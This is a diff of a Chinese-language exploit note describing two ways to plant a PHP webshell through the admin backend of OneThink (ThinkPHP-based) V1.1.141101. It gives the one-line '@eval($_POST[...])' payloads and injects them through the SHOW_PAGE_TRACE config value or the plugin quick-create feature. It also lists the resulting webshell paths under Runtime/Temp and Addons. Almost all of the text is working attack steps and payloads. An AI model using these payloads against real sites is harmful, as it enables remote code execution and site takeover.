@@ -1,5 +1,5 @@
 /admin.php?s=/Config/group/id/4.html
-�Ƿ���ʾҳ��Trace
+是否显示页面Trace
 ?><?php @eval($_POST[1]);echo 1;//{
 
 http://x.com/Runtime/Temp/6a658a89308acd6a88f324a7815b2777.php
@@ -7,8 +7,38 @@ http://x.com/Runtime/Temp/6a658a89308acd6a88f324a7815b2777.php
 -----------------------------------------------
 
 http://x.com/admin.php?s=/Addons/create.html
-������ٴ��� ��ѡ�Ƿ���Ҫ���� ֱ��д
+插件快速创建 勾选是否需要配置 直接写
 file_put_contents("1.php",'<?php @eval($_REQUEST[1]);?>');
-��Ŀ¼����1.php
+根目录生成1.php
 
 ------------------------------------------------
+
+OneThinkphp管理平台V1.1.141101版本后台getshell，很早之前读代码,发现的
+第一个方法是  在runtime文件夹可以访问的情况下可以尝试用这个办法
+访问 http://127.0.0.1:85/admin.php?s=/Config/index.html   这个路径 找到 SHOW_PAGE_TRACE
+ 
+SHOW_PAGE_TRACE
+配置类型
+字符
+ 
+ 
+配置值（配置值）
+";}
+@eval($_POST['bugscaner']);//
+
+webshell地址  http://127.0.0.1:85/Runtime/Temp/95a1fe934b68ebfee8468bf0bc4f0000.php
+第二个方法是  在runtime文件夹不可以访问的情况下尝试使用下面的方法
+插件管理  http://127.0.0.1:85/admin.php?s=/Addons/index.html
+ 
+添加插件    快速创建
+ 
+*标识名   logging
+ 
+是否需要配置   选择之后 写入一句话
+<?php @eval($_POST[1]);?>
+
+确定即可
+ 
+一句话路径为
+http://127.0.0.1:85/Addons/logging/config.php
+
